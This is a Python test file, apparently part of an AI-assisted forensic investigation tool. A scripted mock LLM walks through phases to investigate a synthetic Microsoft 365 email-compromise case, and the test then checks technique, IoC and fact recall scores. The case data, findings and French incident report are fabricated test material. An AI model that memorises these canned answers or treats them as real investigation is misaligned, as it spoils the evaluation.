REPORT = """# Compromission de messagerie (BEC) : a.martin@nordbridge.fr
## Resume executif
Pulverisation de mots de passe depuis 102.89.47.13, fatigue MFA sur a.martin@nordbridge.fr,
consentement OAuth a MailSync Pro puis regle de transfert vers compta.nordbridge@proton.me.
## Chronologie
- 2026-10-12T08:10Z pulverisation ; 08:20Z-08:30Z refus MFA ; 08:33Z connexion depuis Lagos.
- 08:39Z consentement MailSync Pro ; 08:45Z regle '.' de transfert.
## Indicateurs de compromission (IoC)
- 102.89.47.13
- compta.nordbridge@proton.me
## Mapping MITRE ATT&CK
T1110.003, T1621, T1078.004, T1528, T1114.003
## Conclusions
Compte a.martin@nordbridge.fr compromis.
## Recommandations
Revoquer les sessions, supprimer MailSync Pro et la regle, bloquer 102.89.47.13.
"""


def _call(name, args):
    return {'tool_calls': [{'id': name, 'type': 'function',
                            'function': {'name': name, 'arguments': json.dumps(args)}}]}


def _refs(path, rule):
    det = formats.detect(path)
    events, _ = formats.load_events(path, det)
    findings, _alerts, _notes, _ran = rules.run(events, det['format'], os.path.basename(path))
    return next(f for f in findings if f['rule'] == rule)['refs'][:3]


class CloudCaseLLM:
    def __init__(self, **kwargs):
        self.usage = {'prompt_tokens': 0, 'completion_tokens': 0, 'total_tokens': 0, 'calls': 0}
        self.step = {}

    def chat(self, messages, tools=None, model=None):
        self.usage['calls'] += 1
        if tools is None or 'verificateur' in messages[0]['content']:
            return {'content': 'fin'}
        prompt = messages[1]['content']
        phase = int(prompt.split('PHASE ', 1)[1][0])
        case = prompt.split('Dossier du cas : ', 1)[1].split('\n', 1)[0].strip()
        n = self.step.get(phase, 0)
        self.step[phase] = n + 1
        signins = os.path.join(case, 'entra_signins.json')
        ual = os.path.join(case, 'm365_unified_audit_log.csv')

        def finding(title, mitre, path, rule):
            return _call('record_finding', {'case_dir': case, 'title': title, 'severity': 'high', 'mitre': mitre,
                                            'evidence': os.path.basename(path), 'confidence': 'confirmed',
                                            'evidence_refs': _refs(path, rule)})
        script = {
            1: [_call('list_artifacts', {'case_dir': case}),
                _call('set_investigation_plan', {'case_dir': case, 'steps': ['Connexions', 'Audit M365']})],
            2: [_call('cloud_detect_format', {'file_path': signins}),
                _call('cloud_parse_log', {'file_path': signins}),
                _call('cloud_parse_log', {'file_path': ual}),
                _call('cloud_hunt', {'file_path': signins}),
                _call('cloud_hunt', {'file_path': ual}),
                _call('audit_tool_coverage', {'case_dir': case})],
            3: [finding('Pulverisation depuis 102.89.47.13', 'T1110.003', signins, 'password_spray'),
                finding('Fatigue MFA sur a.martin@nordbridge.fr', 'T1621', signins, 'mfa_fatigue'),
                finding('Voyage impossible Paris -> Lagos', 'T1078.004', signins, 'impossible_travel'),
                finding('Consentement OAuth a MailSync Pro', 'T1528', ual, 'oauth_consent'),
                finding('Regle de transfert vers compta.nordbridge@proton.me', 'T1114.003', ual,
                        'inbox_rule_forward')],
            4: [_call('challenge_finding', {'case_dir': case, 'finding_id': i, 'verdict': 'upheld',
                                            'alternative': 'Activite legitime',
                                            'rationale': 'IP etrangere jamais vue, chaine coherente.'})
                for i in range(1, 6)] + [_call('audit_tool_coverage', {'case_dir': case}),
                                         _call('audit_evidence_coverage', {'case_dir': case})],
            5: [_call('save_report', {'case_dir': case, 'title': 'BEC', 'markdown': REPORT})],
        }[phase]
        return script[n] if n < len(script) else {'content': 'phase terminee'}


def test_enquete_cloud_bout_en_bout(monkeypatch):
    monkeypatch.setattr(phases, 'CopilotClient', CloudCaseLLM)
    monkeypatch.delenv('PHOENIX_INVESTIGATION_MODE', raising=False)
    report = evaluation.run_suite(SUITE, only=['cloud_m365_bec_oauth'], mode='phased')
    case = report['cases'][0]
    assert 'error' not in case, case
    sc = case['score']
    assert sc['technique_recall'] == 1.0 and sc['ioc_recall'] == 1.0, sc
    assert sc['fact_exact'] == 1.0, sc['facts']
    assert sc['passed'], sc
    assert not os.path.exists(os.path.join(M365, memory.STATE_FILENAME))


def test_suite_cloud_annotee():
    cases = {name: truth for name, _d, truth in evaluation.load_suite(SUITE)}
    expected = {'cloud_m365_bec_oauth', 'cloud_aws_key_compromise', 'cloud_gcp_external_owner',
                'k8s_privileged_escape', 'linux_auditd_persistence', 'identity_benign_admin'}
    assert expected <= set(cases)
    for name in expected:
        truth = cases[name]
        assert truth['benign'] or (truth['techniques'] and truth['facts']), name
        for f in os.listdir(os.path.join(SUITE, name)):
            assert os.path.getsize(os.path.join(SUITE, name, f)) < 300 * 1024, f
    # Chaque technique attendue est produite par les detections deterministes
    hunts = {'cloud_m365_bec_oauth': [SIGNINS, UAL], 'cloud_aws_key_compromise': [AWS],
             'cloud_gcp_external_owner': [GCP], 'k8s_privileged_escape': [K8S],
             'linux_auditd_persistence': [AUDITD]}
    for name, paths in hunts.items():
        found = {t.strip() for p in paths for f in _hunt(p)['findings'] for t in f['mitre'].split(',')}
        for tech in cases[name]['techniques']:
            assert evaluation.technique_matches(tech, found), (name, tech, found)
        for tech in cases[name]['forbidden_techniques']:
            assert not evaluation.technique_matches(tech, found), (name, tech)
